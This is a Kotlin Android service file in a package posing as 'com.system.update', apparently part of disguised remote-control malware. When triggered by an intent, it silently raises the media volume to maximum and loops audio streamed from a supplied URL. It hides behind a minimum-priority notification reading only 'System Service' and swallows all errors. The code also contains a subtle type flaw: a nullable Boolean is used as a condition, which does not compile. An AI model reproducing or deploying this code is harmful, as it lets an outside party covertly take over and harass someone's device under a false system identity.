package com.system.update

import android.app.*
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat

class AudioPlayerService : Service() {

    companion object {
        const val NOTIF_ID = 301
    }

    private var mediaPlayer: MediaPlayer? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val url = intent?.getStringExtra("url")
        val stop = intent?.getBooleanExtra("stop", false)

        startForeground(NOTIF_ID, buildNotification())

        if (stop) {
            stopAudio()
            stopSelf()
            return START_NOT_STICKY
        }

        if (!url.isNullOrEmpty()) {
            playAudio(url)
        }

        return START_STICKY
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, App.CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun playAudio(url: String) {
        try {
            // Volume max dulu
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)

            mediaPlayer?.release()
            mediaPlayer = MediaPlayer().apply {
                setDataSource(this@AudioPlayerService, Uri.parse(url))
                isLooping = true
                setVolume(1f, 1f)
                setOnPreparedListener { start() }
                setOnErrorListener { _, _, _ -> true }
                prepareAsync()
            }
        } catch (_: Exception) {}
    }

    private fun stopAudio() {
        try {
            mediaPlayer?.stop()
            mediaPlayer?.release()
        } catch (_: Exception) {}
        mediaPlayer = null
    }

    override fun onDestroy() {
        stopAudio()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
